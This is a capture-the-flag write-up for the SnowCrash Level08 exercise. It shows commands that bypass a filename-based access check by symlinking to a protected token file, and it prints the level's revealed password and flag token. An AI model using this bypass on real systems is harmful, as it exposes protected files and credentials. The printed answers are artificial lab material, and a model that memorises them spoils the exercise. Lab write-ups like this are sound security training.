# Level08

# context

after login with user `level08` to files apears in home dir
```
level08@SnowCrash:~$ ls
level08  token
level08@SnowCrash:~$
```

# steps to repreduce

first thing let's run the executeable and see what doing
```
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$
```

so this need a file as an arg, let's pass second file as arg

```
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$
```

I don't have access to `token` file,

I need to create new file to test the output.
```
level08@SnowCrash:~$ chmod 777 . <== so I can create files in home dir
level08@SnowCrash:~$ echo "hello world" > test
level08@SnowCrash:~$ ./level08 test
hello world
level08@SnowCrash:~$
```

as you can see the file reads the content of the file and print it.
so I need a way so i can read the `token` file.

one of the methods I want to use is to create Symbolic Link to the `token` file so I can read it
```
level08@SnowCrash:~$ ln -s token getflag
level08@SnowCrash:~$
```

now let's pass the link to `level08` file
```
level08@SnowCrash:~$ ./level08 getflag
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$
```
this is the token of `flag08`
```
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$
```
